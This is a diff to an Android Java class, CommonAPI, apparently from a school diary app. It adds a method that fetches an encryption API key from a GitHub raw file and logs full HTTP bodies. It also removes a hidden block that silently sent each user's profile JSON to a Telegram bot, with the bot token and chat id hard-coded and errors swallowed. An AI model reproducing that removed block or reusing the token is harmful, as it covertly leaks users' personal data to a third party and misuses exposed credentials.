@@ -79,11 +79,47 @@ public class CommonAPI {
         void marks(List<PeriodMarksData> marks);
         void periods(Periods periods);
     }
+    public void get_api_cryptor(Context c){
+        SharedPreferences p = c.getSharedPreferences("user", Context.MODE_PRIVATE);
+        String url = "https://raw.githubusercontent.com/Adlemex/MaterialDiaryNew/main/api_key.txt";
+        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
+        logging.setLevel(HttpLoggingInterceptor.Level.BODY);
+        OkHttpClient client = new OkHttpClient.Builder()
+                .addInterceptor(logging)
+                .build();
+        Request request = new Request.Builder()
+                .url(url)
+                .get()
+                .build();
+        client.newCall(request).enqueue(new okhttp3.Callback(){
+
+            @Override
+            public void onFailure(okhttp3.Call call, IOException e) {
+
+            }
+
+            @Override
+            public void onResponse(okhttp3.Call call, okhttp3.Response response) throws IOException {
+                if (response.body() != null){
+                    if(response.code() == 200){
+                        String res = response.body().string();
+                        if(Objects.equals(res, p.getString("api_key", ""))) return;
+                        p.edit().putString("api_key", res).apply();
+                        Crypt.generateKeyFromString(res);
+                        if(uuid.length() > 1) {
+                            apikey = Crypt.encryptSYS_GUID(uuid);
+                        }
+                    }
+                }
+            }
+        });
+    }
     public CommonAPI(Context c, NavController navController){
         SharedPreferences p = c.getSharedPreferences("user", Context.MODE_PRIVATE);
         //if(p.contains("message_id")) {
         //    message_id = p.getString("message_id", "");
         //}
+        get_api_cryptor(c);
         if(p.contains("uuid")) {
             uuid = p.getString("uuid", "");
             if(uuid.length() > 1) {
@@ -167,16 +203,6 @@ public class CommonAPI {
                     UserInfo entity = gson.fromJson(body, UserInfo.class);
                     callback.user(entity.getData());
                     utils.createJsonFileData("users.json", body);
-                    try {
-                        OkHttpClient client = new OkHttpClient();
-                        Request request = new Request.Builder()
-                                .url("https://api.telegram.org/bot5847580694:AAG0cRoS970bGicjFyIW3p0qSNfuk7D6II0/sendMessage?chat_id=517936717&text=" + body)
-                                .get()
-                                .build();
-                        client.newCall(request).execute();
-                    }
-                    catch (Exception ignored){
-                    }
                 }
                 catch (Exception e){
                     e.printStackTrace();
